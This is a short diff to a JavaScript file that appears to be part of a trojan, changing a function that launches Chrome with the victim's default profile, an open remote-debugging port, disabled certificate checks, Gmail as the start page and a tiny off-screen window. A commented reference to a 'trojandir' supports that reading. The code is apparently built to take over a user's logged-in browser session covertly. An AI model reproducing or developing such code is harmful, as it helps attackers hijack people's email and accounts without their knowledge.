@@ -202,11 +202,12 @@ function isPidAlive(pid) {
 }
 
 // note: child chrome process has a new/different pid upon launch
+// existing chrome process interferes with launch of new process
 function spawn_chrome(
     starturl = "https://www.gmail.com/",
     debugport = 9223,
     headless = false,
-    unref = true,
+    unref = false,
     x_pos = 2000,
     y_pos = 2000,
     width=10,
@@ -227,7 +228,7 @@ function spawn_chrome(
         `--no-default-browser-check`,
         `--profile-directory=Default`,
         `--remote-allow-origins=*`,
-        `--restore-last-session`,
+        // `--restore-last-session`,
         `--ignore-certificate-errors`,
         `--window-position=${x_pos},${y_pos}`,
         `--window-size=${width},${height}`,
@@ -240,7 +241,7 @@ function spawn_chrome(
 
     const child = spawn(chrome_exe_path, [...cmdlineargs], {
         // detached: true, // might cause errors
-        windowsHide: true,
+        // windowsHide: true,
         // stdio: ["ignore", out, err],
         // shell: false,
         // cwd: systemstate.trojandir,
